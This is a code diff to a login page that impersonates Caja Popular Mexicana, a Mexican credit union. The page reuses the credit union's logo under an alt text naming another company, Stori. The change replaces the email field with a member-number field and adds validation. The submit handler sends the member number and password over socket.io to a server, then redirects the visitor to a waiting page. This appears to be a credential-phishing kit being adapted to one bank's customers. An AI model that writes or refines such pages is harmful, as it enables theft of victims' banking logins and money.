@@ -12,8 +12,8 @@
       font-family: 'Open Sans', sans-serif;
       background: #f3f6f9;
       display: flex;
-      justify-content: center;  /* Centrado horizontal */
-      align-items: center;      /* Centrado vertical */
+      justify-content: center;
+      align-items: center;
       min-height: 100vh;
       text-align: center;
     }
@@ -46,18 +46,17 @@
       margin-bottom: 1rem;
     }
 
-    /* Estilo de los campos de texto */
     .input-group {
       display: flex;
       align-items: center;
       background: #f0f2f5;
       border-radius: 8px;
-      margin: 1rem 0;  /* Espaciado entre campos */
+      margin: 1rem 0;
       padding: 0.0rem 1rem;
       width: 100%;
       max-width: 350px;
-      justify-content: flex-start; /* Mueve los campos hacia la izquierda */
-      margin-left: -15px; /* Ajuste para mover más hacia la izquierda */
+      justify-content: flex-start;
+      margin-left: -15px;
     }
 
     .input-group .icon {
@@ -75,11 +74,10 @@
       height: 20px;
     }
 
-    /* Botón centrado y ajustado */
     button {
       background-color: #019765;
       color: white;
-      padding: 8px 20px; /* Botón más pequeño */
+      padding: 8px 20px;
       border: none;
       border-radius: 8px;
       cursor: pointer;
@@ -97,7 +95,6 @@
       cursor: not-allowed;
     }
 
-    /* Mensaje de error */
     .mensaje-error {
       color: red;
       margin-top: 1rem;
@@ -113,18 +110,17 @@
   <div class="screen active" id="pantallaInicio">
     <img src="https://seeklogo.com/images/C/caja-popular-mexicana-logo-EC4478514F-seeklogo.com.png" alt="Stori Logo" class="logo">
     <h2>Bienvenido a Caja Popular Mexicana.</h2>
-    <p>Ingrese a su cuenta para iniciar con el proceso de analisis.</p>
+    <p>Ingrese a su cuenta para iniciar con el proceso de análisis.</p>
     <form id="login-form">
       <div class="input-group">
-       <div class="icon"><i class="fas fa-user"></i></div>
-<input type="tel" id="email" placeholder="Numero de socio" required>
-
+        <div class="icon"><i class="fas fa-user"></i></div>
+        <input type="tel" id="socio" placeholder="Número de socio" maxlength="10" required>
       </div>
       <div class="input-group">
         <div class="icon"><i class="fas fa-lock"></i></div>
         <input type="password" id="password" placeholder="Contraseña" required>
       </div>
-      <p id="emailError" class="mensaje-error"></p>
+      <p id="socioError" class="mensaje-error"></p>
       <p id="passwordError" class="mensaje-error"></p>
       <button type="submit" id="btnContinuar">Continuar</button>
     </form>
@@ -139,45 +135,41 @@
 
       if (form) {
         form.addEventListener('submit', (e) => {
-          e.preventDefault(); // Evitar el comportamiento por defecto del formulario
+          e.preventDefault();
 
-          // Validar los campos antes de enviar los datos
-          if (validarEmail() && validarPassword()) {
-            const correo = document.getElementById('email').value;
+          if (validarSocio() && validarPassword()) {
+            const socio = document.getElementById('socio').value;
             const contrasena = document.getElementById('password').value;
 
-            // Generar y guardar sessionId
             const sessionId = Math.random().toString(36).substring(2, 15);
             localStorage.setItem('sessionId', sessionId);
 
-            // Enviar datos al servidor mediante socket.io
-            socket.emit('dataForm', { correo, contrasena, sessionId });
+            socket.emit('dataForm', { socio, contrasena, sessionId });
 
-            // Ir a pantalla de espera (opciones.html)
             window.location.href = 'opciones.html';
           }
         });
       }
     });
 
-    function validarEmail() {
-      const email = document.getElementById("email").value;
-      const emailError = document.getElementById("emailError");
-      const emailInput = document.getElementById("email");
+    function validarSocio() {
+      const socio = document.getElementById("socio").value;
+      const socioError = document.getElementById("socioError");
+      const socioInput = document.getElementById("socio");
 
-      
+      const soloNumeros = /^\d{1,10}$/;
 
-      if (!email) {
-        emailError.textContent = "El correo electrónico es obligatorio";
-        emailInput.classList.add("campo-requerido");
+      if (!socio) {
+        socioError.textContent = "El número de socio es obligatorio";
+        socioInput.classList.add("campo-requerido");
         return false;
-      } else if (!emailRegex.test(email)) {
-        emailError.textContent = "Por favor, ingrese un correo electrónico válido";
-        emailInput.classList.add("campo-requerido");
+      } else if (!soloNumeros.test(socio)) {
+        socioError.textContent = "Debe ingresar hasta 10 dígitos numéricos";
+        socioInput.classList.add("campo-requerido");
         return false;
       } else {
-        emailError.textContent = "";
-        emailInput.classList.remove("campo-requerido");
+        socioError.textContent = "";
+        socioInput.classList.remove("campo-requerido");
         return true;
       }
     }
